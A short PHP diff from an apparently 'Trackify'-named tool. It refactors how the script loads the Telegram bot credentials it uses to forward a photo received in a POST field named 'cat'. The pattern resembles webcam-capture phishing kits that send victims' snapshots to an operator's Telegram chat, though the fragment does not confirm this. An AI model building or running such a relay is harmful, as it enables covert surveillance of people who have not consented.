@@ -61,21 +61,11 @@ if (!empty($_POST['cat'])) {
     @error_log("Received\r\n", 3, __DIR__ . '/Log.log');
 }
 
-// Send to Telegram - load from config file
-$telegram_token = '';
-$telegram_chat = '';
-$config_file = __DIR__ . '/telegram_config.json';
+// Send to Telegram (respects telegram_config.json + "enabled" flag)
+$telegramCreds = trackify_read_telegram_credentials();
+$telegram_token = $telegramCreds['bot_token'] ?? '';
+$telegram_chat = $telegramCreds['chat_id'] ?? '';
 
-if (is_readable($config_file)) {
-    $config_content = (string) file_get_contents($config_file);
-    $config = json_decode($config_content, true);
-    if (is_array($config) && !empty($config['bot_token']) && !empty($config['chat_id'])) {
-        $telegram_token = (string) $config['bot_token'];
-        $telegram_chat = (string) $config['chat_id'];
-    }
-}
-
-// Only send if Telegram is configured
 if ($telegram_token !== '' && $telegram_chat !== '') {
     // Send photo to Telegram using cURL if available, otherwise use file_get_contents
     $url = 'https://api.telegram.org/bot' . $telegram_token . '/sendPhoto';
